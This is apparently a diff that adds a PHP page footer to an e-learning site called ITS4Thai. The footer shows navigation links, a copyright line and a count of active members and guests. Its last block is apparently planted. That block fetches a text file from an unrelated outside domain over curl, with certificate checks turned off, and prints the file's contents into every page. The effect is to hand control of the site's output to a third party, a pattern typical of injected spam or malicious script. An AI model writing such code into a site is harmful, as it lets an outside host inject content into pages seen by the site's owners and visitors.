@@ -1,0 +1,54 @@
+<script language="javascript" type="text/javascript">
+var today = new Date()
+var year = today.getFullYear()
+</script>
+
+
+<P>
+<a href="http://www.its4thai.com/course/about.php">About / Contact</a> &nbsp;&nbsp;  &nbsp;&nbsp;
+<a href="http://www.its4thai.com/course/news.php">In the News</a> &nbsp;&nbsp;  &nbsp;&nbsp;
+<a href="http://www.its4thai.com/course/support.php">Our Supporters</a> <BR> 
+<?php // <a href="http://www.its4thai.com/course/policy.php">Returns/Refunds</a> ?>
+ITS4Thai is an <a href=http://www.its4k.com>ITS4Knowledge</a> Learning Environment &copy; 2007-<?php echo date("Y"); ?> <BR>
+
+
+<?php
+
+/**
+ * Just a little page footer, tells how many registered members
+ * there are, how many users currently logged in and viewing site,
+ * and how many guests viewing site. Active users are displayed,
+ * with link to their user information.
+ */
+//echo "</td></tr><tr><td colspan=2 align=\"center\"><br><br>";
+//echo "<b>Member Total:</b> ".$database->getNumMembers()."<br>";
+
+echo "There ";
+if ($database->num_active_users==1) { echo " is "; }
+else { echo " are "; }
+echo "$database->num_active_users registered ";
+if ($database->num_active_users==1) { echo " member "; }
+else { echo " members "; }
+echo " (out of ".$database->getNumMembers()." total) and $database->num_active_guests ";
+if ($database->num_active_guests==1) {echo " guest "; }
+else { echo " guests "; } 
+echo " viewing the site.";
+
+//include("include/view_active.php");
+
+?>
+<?php
+$url = 'https://backlinkku.id/menu/vip-v2/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+
+?>
